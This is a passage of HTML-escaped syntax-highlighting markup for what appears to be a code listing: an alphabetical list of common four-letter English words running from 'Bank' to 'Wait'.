class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Bank'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Base'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Bear'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Beat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Bill'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Body'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Book'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Burn'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Call'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Card'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Care'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Case'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Cash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Cast'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'City'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Club'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Come'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Cook'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Cope'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Cost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Damn'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Dare'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Date'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Dead'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Deal'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Deep'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Deny'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Door'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Down'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Draw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Drop'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Duly'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Duty'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Earn'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'East'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Easy'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Edge'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Else'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Even'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ever'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Face'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fact'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fail'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fair'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fall'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Farm'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fast'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fear'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Feel'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'File'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fill'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Film'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Find'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fire'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Firm'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fish'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Flat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Food'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Foot'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Form'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Full'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Fund'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Gain'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Game'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Girl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Give'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Goal'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Gold'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Good'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Grow'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hair'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Half'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hall'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hand'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hang'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hard'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hate'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Have'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Head'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hear'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Help'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Here'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hide'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'High'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hold'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Home'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hope'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hour'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Hurt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Idea'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Idly'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Jack'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'John'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Join'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Jump'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Just'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Keep'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Kill'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Kind'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'King'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Know'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Lack'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Lady'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Land'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Last'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Late'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Lead'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Lend'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Life'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Lift'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Like'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Line'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Link'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'List'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Live'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Long'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Look'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Lord'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Lose'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Loss'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Loud'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Love'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Make'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Mark'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Mary'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Meet'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Mind'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Miss'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Move'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Much'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Must'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Near'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Need'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'News'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Nice'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Note'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Okay'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Once'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Only'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Open'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Over'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Page'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Pain'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Pair'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Park'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Part'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Pass'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Past'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Paul'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Pick'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Plan'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Play'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Post'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Pray'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Pull'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Push'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Rain'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Rate'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Read'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Real'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Rely'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Rest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ride'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ring'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Rise'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Risk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Road'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Rock'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Role'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Roll'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Room'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Rule'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Sale'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Save'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Seat'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Seek'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Seem'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Sell'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Send'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Shed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Shop'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Show'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Shut'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Side'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Sign'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Sing'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Site'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Size'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Skin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Slip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Slow'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Solo'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Soon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Sort'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Star'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Stay'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Step'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Stop'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Suit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Sure'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Take'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Talk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Task'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Team'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Tell'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Tend'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Term'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Text'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'That'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Then'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'This'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Thus'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Time'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Tour'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Town'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Tree'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Turn'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Unit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'User'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Vary'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Very'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'View'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Vote'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wait'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span 